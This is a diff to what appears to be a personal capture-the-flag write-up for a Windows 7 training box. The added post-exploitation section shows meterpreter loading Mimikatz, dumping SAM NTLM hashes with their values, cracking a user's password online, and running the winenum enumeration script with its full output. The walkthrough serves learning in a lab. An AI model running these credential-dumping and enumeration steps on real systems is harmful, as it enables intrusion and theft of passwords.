@@ -57,7 +57,9 @@ Host script results:
 
 ```
 
-TONS of information here! We can see a slrew of open ports running various services, and with the -sC flag, we are able to run a basic nmap script scan that comes by default. 
+TONS of information here! We can see a slew of open ports running various services, and with the -sC flag, we are able to run a basic nmap script scan that comes by default. 
+
+## Exploitation
 
 I jumped the gun and was curious to see what exploits Windows 7 Build 7601 are available:
 
@@ -74,7 +76,7 @@ Omnicom Alpha 4.0e LPD Server - Denial of Service                               
 ------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
-## Exploitation
+
 
 I decided to look up the infamous EternalBlue exploit and see if it would work on this box simply due to the build number and OS being over a decade old. I had to try it!!!
 
@@ -153,6 +155,118 @@ meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 meterpreter > 
 ```
-## Post Exploitation:
+## Post Exploitation/Privilege Escalation:
 
-*Will continue to pwn this box in the coming days*
+Now that we have a meterpreter session going, lets try to escalate priviledges with Mimikatz:
+
+```bash
+meterpreter > load mimikatz
+Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (6.1 Build 7601, Service Pack 1).). Did you mean to 'load kiwi' instead?
+Success.
+meterpreter > mimikatz_command -f version
+mimikatz 1.0 x64 (RC) (Jun 26 2020 21:27:49)
+meterpreter > msv
+[+] Running as SYSTEM
+[*] Retrieving msv credentials
+msv credentials
+===============
+
+AuthID   Package    Domain        User           Password
+------   -------    ------        ----           --------
+0;997    Negotiate  NT AUTHORITY  LOCAL SERVICE  n.s. (Credentials KO)
+0;996    Negotiate  WORKGROUP     JON-PC$        n.s. (Credentials KO)
+0;22657  NTLM                                    n.s. (Credentials KO)
+0;999    NTLM       WORKGROUP     JON-PC$        n.s. (Credentials KO)
+meterpreter > mimikatz_command -f samdump::hashes
+Ordinateur : Jon-PC
+BootKey    : 55bd17830e678f18a3110daf2c17d4c7
+
+Rid  : 500
+User : Administrator
+LM   : 
+NTLM : 31d6cfe0d16ae931b73c59d7e0c089c0
+
+Rid  : 501
+User : Guest
+LM   : 
+NTLM : 
+
+Rid  : 1000
+User : Jon
+LM   : 
+NTLM : ffb43f0de35be4d9917ac0cc8ad57f8d
+```
+
+We have some hashes that need to be cracked! I tried plugging them into a reverse MD5 site to no avail. I just happened to stumble upon crackstation, a website that lets you plug in a variety of hashes, including our NTLM hashes. User ```Jon```'s password was ```alqfna22```, but our Administrator's password was the interesting one, which turned out to be simply a blank password. Doing a little digging, this hash reveals to us that the local admin account is disabled. Saad face. 
+
+
+I guess I should have read more about ```NT AUTHORITY\SYSTEM``` and how it is basically the ```root``` of the Windows world. I had already pwned this box, but I guess I was just having fun trying to see what else I could find now that I was ```"root"```. And so we shall:
+
+```bash
+meterpreter > run winenum
+[*] Running Windows Local Enumeration Meterpreter Script
+[*] New session on 10.10.105.201:445...
+[*] Saving general report to /Users/titanium/.msf4/logs/scripts/winenum/JON-PC_20200711.4713/JON-PC_20200711.4713.txt
+[*] Output of each individual command is saved to /Users/titanium/.msf4/logs/scripts/winenum/JON-PC_20200711.4713
+[*] Checking if JON-PC is a Virtual Machine ........
+[*] 	This is a Xen Virtual Machine.
+[*] 	UAC is Disabled
+[*] Running Command List ...
+[*] 	running command cmd.exe /c set
+[*] 	running command arp -a
+[*] 	running command ipconfig /all
+[*] 	running command ipconfig /displaydns
+[*] 	running command net view
+[*] 	running command netstat -nao
+[*] 	running command route print
+[*] 	running command netstat -vb
+[*] 	running command netstat -ns
+[*] 	running command net accounts
+[*] 	running command net share
+[*] 	running command net group
+[*] 	running command net group administrators
+[*] 	running command net view /domain
+[*] 	running command net localgroup
+[*] 	running command net localgroup administrators
+[*] 	running command net user
+[*] 	running command netsh firewall show config
+[*] 	running command tasklist /svc
+[*] 	running command net session
+[*] 	running command netsh wlan show drivers
+[*] 	running command gpresult /SCOPE COMPUTER /Z
+[*] 	running command netsh wlan show networks mode=bssid
+[*] 	running command netsh wlan show interfaces
+[*] 	running command netsh wlan show profiles
+[*] 	running command gpresult /SCOPE USER /Z
+[*] Running WMIC Commands ....
+[*] 	running command wmic useraccount list
+[*] 	running command wmic group list
+[*] 	running command wmic service list brief
+[*] 	running command wmic volume list brief
+[*] 	running command wmic netlogin get name,lastlogon,badpasswordcount
+[*] 	running command wmic netuse get name,username,connectiontype,localname
+[*] 	running command wmic netclient list brief
+[*] 	running command wmic logicaldisk get description,filesystem,name,size
+[*] 	running command wmic nteventlog get path,filename,writeable
+[*] 	running command wmic share get name,path
+[*] 	running command wmic startup list full
+[*] 	running command wmic rdtoggle list
+[*] 	running command wmic product get name,version
+[*] 	running command wmic qfe
+[*] Extracting software list from registry
+[*] Dumping password hashes...
+[*] Hashes Dumped
+[*] Getting Tokens...
+[*] All tokens have been processed
+[*] Done!
+```
+
+Meterpreter has one hell of a powerful post exploitation command, ```winenum``` which as you can see above, basically dumps almost all information you could want from a Windows machine from local accounts, local admin accounts, session information, firewall configs, ```ipconfig``` outputs, wireless interfaces, drivers for those interfaces, environment variables, dumped more password hashes, extracted tokens, the list keeps going on and on...
+
+## PS (PowerShell) Empire
+
+The point of this box was to get dirty with the PS Empire framework. Lets get started:
+
+1) Which menu to we launch to access listeners?
+
+
